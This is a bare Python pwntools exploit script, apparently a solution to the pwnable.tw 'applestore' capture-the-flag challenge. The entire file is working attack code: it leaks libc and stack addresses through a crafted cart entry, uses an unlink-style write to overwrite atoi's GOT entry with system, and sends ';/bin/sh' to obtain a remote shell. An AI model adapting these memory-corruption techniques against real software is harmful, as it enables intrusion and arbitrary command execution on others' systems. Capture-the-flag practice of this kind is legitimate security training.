from pwn import *
import sys

host ='chall.pwnable.tw'
port = 10104

if len(sys.argv) > 1:
    r = remote(host, port)
else:
    r = process('./applestore', env={'LD_PRELOAD': './libc_32.so.6'})

price = {'299': '2', '199': '1',}

def add(p):
    r.sendlineafter('>', '2')
    r.sendlineafter('>', price[p])

def delete(idx, payload):
    r.sendlineafter('>', '3')
    r.sendafter('>', str(idx) + payload)

def checkout():
    r.sendlineafter('>', '5')
    r.sendafter('>', 'y\x0a' + '\xff'*0x13)

def cart(payload):
    r.sendlineafter('>', '4')
    r.sendafter('>', 'y\x0a' + payload)


puts_got = 0x804b028
puts_offset = 0x5f140
atoi_got = 0x804b040
environ_offset = 0x1b1dbc
ebp_offset = 0x104
system_offset = 0x3a940
for i in range(0,20):
    add('299')
for i in range(0, 6):
    add('199')

checkout()

cart(p32(puts_got) + '\x00'*12)
r.recvuntil('27: ')
libc = u32(r.recvuntil('\n')[0:4]) - puts_offset
log.info('libc: ' + hex(libc))

cart(p32(libc+environ_offset) + '\x00'*12)
r.recvuntil('27: ')
stack = u32(r.recvuntil('\n')[0:4]) - ebp_offset
log.info('stack: ' + hex(stack))

raw_input('#')
delete(27, p32(0)*2 + p32(atoi_got+0x22) + p32(stack-0x8))

r.sendlineafter('>', p32(libc+system_offset) + ';/bin/sh\x00')

r.interactive()
